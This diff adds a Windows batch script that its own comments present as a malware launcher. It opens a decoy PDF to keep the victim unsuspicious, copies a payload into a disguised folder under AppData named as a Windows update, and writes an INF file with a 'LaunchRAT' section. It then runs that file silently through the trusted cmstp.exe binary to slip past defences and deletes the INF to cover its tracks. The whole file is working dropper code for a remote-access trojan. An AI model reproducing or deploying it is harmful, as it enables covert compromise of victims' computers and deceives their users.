@@ -1,0 +1,30 @@
+@echo off
+:: 1. Open the decoy immediately so the victim isn't suspicious
+start "" "Decoy.pdf"
+
+:: 2. Set hidden workspace
+set "workDir=%APPDATA%\Microsoft\Vault"
+if not exist "%workDir%" mkdir "%workDir%"
+
+:: 3. Move payload to hidden folder
+copy "private_client.bat" "%workDir%\update.bat" >nul
+
+:: 4. Create the INF trigger for CMSTP
+(
+echo [Version]
+echo Signature="$Windows NT$"
+echo [DefaultInstall_SingleUser]
+echo RunPreSetupCommands=LaunchRAT
+echo [LaunchRAT]
+echo cmd.exe /c "%workDir%\update.bat"
+echo [Strings]
+echo ServiceName="WindowsUpdate"
+echo ShortSvcName="WindowsUpdate"
+) > "%workDir%\trigger.inf"
+
+:: 5. Execute via trusted Microsoft CMSTP (Silent & No-Install)
+cmstp.exe /ni /s "%workDir%\trigger.inf"
+
+:: 6. Cleanup launcher
+del "%workDir%\trigger.inf"
+exit
